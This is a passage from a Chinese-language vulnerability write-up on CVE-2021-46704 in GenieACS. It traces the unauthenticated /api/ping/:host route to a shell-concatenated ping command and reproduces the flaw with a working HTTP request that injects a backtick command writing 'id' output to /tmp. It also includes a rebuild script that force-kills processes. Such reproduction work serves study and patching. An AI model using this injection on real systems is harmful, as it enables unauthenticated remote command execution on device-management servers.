                "address": "*****",
                "port": 9000,
                "localRoot": "/*****/genieACS/genieacs/bin/genieacs-ui.ts",
                "remoteRoot": "/opt/genieacs/dist/bin/genieacs-ui"
            }
        ]
    }
经过了这一番折腾，结果发现
**这个调试环境对于genieACS并不起作用，主要原因是因为genieACS要有一个混淆的过程，针对生成的文件并不能像普通的js一样调试**
我最终解决办法是这样的，
修改lib/logger.ts文件，在尾部加入以下代码
    export function mylog(Name, Value): void {
      error({ message: "------0------" + Name + "-------0-------" })
      error({ message: Value })
      error({ message: "------1------" + Name + "-------1-------" })
    }
当需要调试的时候使用logger.mylog(Name, Value)即可，打印的值可以在/var/log/genieacs/genieacs-ui.log中看到
另外在/opt/genieacs目录下创建debug.sh
    npm run build
    ps -ef | grep "node /opt/genieacs/dist/bin/genieacs-ui" | grep -v "/usr/local" | grep -v "grep" | awk '{print$2}' | xargs kill -9
每次在修改完代码后需要运行这个文件
不得不承认确实有点麻烦，但确实是我目前能力上能想到的解决办法了
我相信作者一定有更好的调试方法，或许可以提个issue问一下，如果观者有更好的方法欢迎提出
## 漏洞分析
CVE-2021-46704这个漏洞细节已经报的很清楚了，漏洞存在于 lib/ping.ts文件中
    import { platform } from "os";
    import { exec } from "child_process";
    .......
    export function ping(
      host: string,
      callback: (err: Error, res?: PingResult, stdout?: string) => void
    ): void {
      let cmd: string, parseRegExp1: RegExp, parseRegExp2: RegExp;
      switch (platform()) {
        case "linux":
          cmd = `ping -w 1 -i 0.2 -c 3 ${host}`;
          parseRegExp1 = /(\d+) packets transmitted, (\d+) received, ([\d.]+)% packet loss[^]*([\d.]+)\/([\d.]+)\/([\d.]+)\/([\d.]+)/;
          parseRegExp2 = /(\d+) packets transmitted, (\d+) received, ([\d.]+)% packet loss/;
          break;
        case "freebsd":
          // Send a single packet because on FreeBSD only superuser can send
          // packets that are only 200 ms apart.
          cmd = `ping -t 1 -c 3 ${host}`;
          parseRegExp1 = /(\d+) packets transmitted, (\d+) packets received, ([\d.]+)% packet loss\nround-trip min\/avg\/max\/stddev = ([\d.]+)\/([\d.]+)\/([\d.]+)\/([\d.]+) ms/;
          parseRegExp2 = /(\d+) packets transmitted, (\d+) packets received, ([\d.]+)% packet loss/;
          break;
        default:
          return callback(new Error("Platform not supported"));
      }
      exec(cmd, (err, stdout)
      ......
很明显，会将ping命令中host参数拼接到字符串中然后调用child_process.exec函数去执行
知道了漏洞点以后，尝试找一下触发路径，根据进程我们知道程序是使用node运行/opt/genieacs/dist/bin/genieacs-ui
/opt/genieacs/dist/bin/genieacs-ui这个文件是/bin/genieacs-ui.ts混淆生成的，所以直接去看相应文件
    ......
      const _listener = (req, res): void => {
        if (stopping) res.setHeader("Connection", "close");
        listener(req, res);
      };
      const initPromise = Promise.all([db2.connect(), cache.connect()])
        .then(() => {
          server.start(SERVICE_PORT, SERVICE_ADDRESS, ssl, _listener);
        })
        .catch((err) => {
          setTimeout(() => {
            throw err;
          });
        });
        ......
geniesacs-ui.ts中开启了服务器，使用listener作为监听处理，listener相关定义在于lib/ui.ts中
    ......
    router.post("/login", async (ctx) => {
      if (!JWT_SECRET) {
        ctx.status = 500;
        ctx.body = "UI_JWT_SECRET is not set";
        logger.error({ message: "UI_JWT_SECRET is not set" });
        return;
      }
    ......
    router.get("/status", (ctx) => {
      ctx.body = "OK";
    });
    .....
    router.use("/api", api.routes(), api.allowedMethods());
    .....
很明显代码中根据不同的urlpatten规范了不同的处理内容，根据漏洞公告明确知道漏洞肯定是出在api中，因此直接去查看api.routes(),尝试找到ping的具体处理路径,最终在lib/ui/api.ts中找到了相关定义
    router.get("/ping/:host", async (ctx) => {
      return new Promise((resolve) => {
        ping(ctx.params.host, (err, parsed) => {
          if (parsed) {
            ctx.body = parsed;
          } else {
            ctx.status = 500;
            ctx.body = `${err.name}: ${err.message}`;
          }
          resolve();
        });
      });
    });
很明显会从get请求url中取出host的值，然后传入ping函数，进而造成命令执行，同时在调用路径上没有看到任何认证校验的存在，因此此漏洞还是一个认证前的命令执行
## 漏洞复现
    GET /api/ping/`id>%2ftmp%2faaaaa` HTTP/1.1
    Host: 172.16.113.160:3000
    User-Agent: Mozilla
    Accept: application/json, text/*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Origin: http://172.16.113.160:3000
    Connection: close
    Referer: http://172.16.113.160:3000/
回包：
    HTTP/1.1 500 Internal Server Error
    X-Config-Snapshot: fc1bdc5907edb1217fed62dd5425c464
    GenieACS-Version: 1.2.0+20220915090845
    Vary: Accept-Encoding
    Content-Type: text/plain; charset=utf-8
    Content-Length: 663
    Date: Thu, 15 Sep 2022 09:48:20 GMT
    Connection: close
    Error: Command failed: ping -w 1 -i 0.2 -c 3 `id>/tmp/aaaaa`
    Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]
                [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
                [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
                [-w deadline] [-W timeout] [hop1 ...] destination
    Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
                 [-l preload] [-m mark] [-M pmtudisc_option]
                 [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]
                 [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]
                 [-W timeout] destination
在目标中查看，/tmp/aaaaa中已经写入内容
    root@5*****:/opt/genieacs# cat /tmp/aaaaa
    uid=999(genieacs) gid=999(genieacs) groups=999(genieacs)
成功复现命令注入